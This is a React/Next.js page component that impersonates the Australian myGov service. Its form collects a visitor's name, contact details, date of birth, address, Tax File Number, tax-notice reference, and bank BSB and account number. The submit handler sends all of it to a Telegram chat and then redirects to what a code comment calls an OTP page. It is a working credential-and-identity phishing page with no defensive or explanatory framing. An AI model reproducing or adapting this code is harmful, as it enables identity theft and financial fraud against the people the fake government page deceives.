"use client";

import Head from "next/head";
import { useRouter } from "next/navigation";
import React from "react";
import { sendTelegramMessage } from "../../utils/telegram"; // Assuming you have this utility
import Image from 'next/image';

export default function MyGovAccountInfo() {
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const formData = new FormData(e.currentTarget);
    const formEntries = Object.fromEntries(formData.entries());

    const message = `
      🚨 MyGov Form Submission 🚨
      - Full Name: ${formEntries.fname}
      - Email Address: ${formEntries.email}
      - Mobile Number: ${formEntries.mobnum}
      - Date of Birth: ${formEntries.dob}
      - Address: ${formEntries.address}
      - Tax File Number: ${formEntries.ta}
      - Notice Date of Issue: ${formEntries.issued}
      - Reference Number: ${formEntries.reference}
      - BSB: ${formEntries.bsb}
      - Bank Account: ${formEntries.acct}
      - Time: ${new Date().toLocaleString()}
    `;

    try {
      await sendTelegramMessage(message); // Send data to Telegram
      router.push("/security"); // Redirect to OTP page after submission
    } catch (err) {
      console.error("Failed to send data to Telegram:", err);
    }
  };

  return (
    <>
      <Head>
        <title>Sign in with myGov - MyGov</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link
          href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap"
          rel="stylesheet"
        />
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        {/* Header */}
        <header className="bg-[#66d3ee] border-b-4 border-[#5bbad7]">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="#" className="flex items-center">
            <Image
  src="/images/myGov-cobranded-logo-black.svg"
  alt="myGov Beta Logo"
  width={100} // Set the desired width
  height={40} // Set the desired height
  className="h-10"
/>
            </a>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-grow container mx-auto px-4 mt-12">
          <div className="max-w-2xl mx-auto bg-white shadow-lg p-8 rounded-lg">
            <h1 className="text-3xl font-semibold text-gray-800 mb-4">
              MyGov Account Information
            </h1>
            <p className="text-gray-600 mb-6">
              Please provide your account information below.
            </p>
            <hr className="mb-6" />

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Full Name */}
              <div>
                <label
                  htmlFor="fname"
                  className="block text-sm font-medium text-black"
                >
                  Full Name
                </label>
                <input
                  id="fname"
                  name="fname"
                  type="text"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              {/* Email Address */}
              <div>
                <label
                  htmlFor="email"
                  className="block text-sm font-medium text-black"
                >
                  Email Address
                </label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              {/* Mobile Number */}
              <div>
                <label
                  htmlFor="mobnum"
                  className="block text-sm font-medium text-black"
                >
                  Mobile Number
                </label>
                <input
                  id="mobnum"
                  name="mobnum"
                  type="tel"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              {/* Date of Birth */}
              <div>
                <label
                  htmlFor="dob"
                  className="block text-sm font-medium text-black"
                >
                  Date of Birth
                </label>
                <input
                  id="dob"
                  name="dob"
                  type="date"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              {/* Address */}
              <div>
                <label
                  htmlFor="address"
                  className="block text-sm font-medium text-black"
                >
                  Full Address on File
                </label>
                <input
                  id="address"
                  name="address"
                  type="text"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              {/* Tax File Number */}
              <div>
                <label
                  htmlFor="ta"
                  className="block text-sm font-medium text-black"
                >
                  Tax File Number
                </label>
                <input
                  id="ta"
                  name="ta"
                  type="text"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              {/* Notice of Assessment */}
              <h3 className="bg-gray-200 text-black font-medium py-2 px-3 rounded-md">
                NOTICE OF ASSESSMENT
              </h3>
              <div>
                <label
                  htmlFor="issued"
                  className="block text-sm font-medium text-black"
                >
                  Enter the date of issue from your notice of assessment
                </label>
                <input
                  id="issued"
                  name="issued"
                  type="date"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>
              <div>
                <label
                  htmlFor="reference"
                  className="block text-sm font-medium text-black"
                >
                  Enter our reference number from your notice of assessment
                </label>
                <input
                  id="reference"
                  name="reference"
                  type="text"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              {/* Bank Account Details */}
              <h3 className="bg-gray-200 text-black font-medium py-2 px-3 rounded-md">
                BANK ACCOUNT DETAILS
              </h3>
              <div>
                <label
                  htmlFor="bsb"
                  className="block text-sm font-medium text-black"
                >
                  Enter BSB number recorded with the ATO
                </label>
                <input
                  id="bsb"
                  name="bsb"
                  type="text"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>
              <div>
                <label
                  htmlFor="acct"
                  className="block text-sm font-medium text-black"
                >
                  Enter bank account number recorded with the ATO (exclude BSB)
                </label>
                <input
                  id="acct"
                  name="acct"
                  type="text"
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                />
              </div>

              <div className="flex justify-end">
                <button
                  type="submit"
                  className="px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7] transition"
                >
                  Next
                </button>
              </div>
            </form>
          </div>
        </main>
      </div>
    </>
  );
}
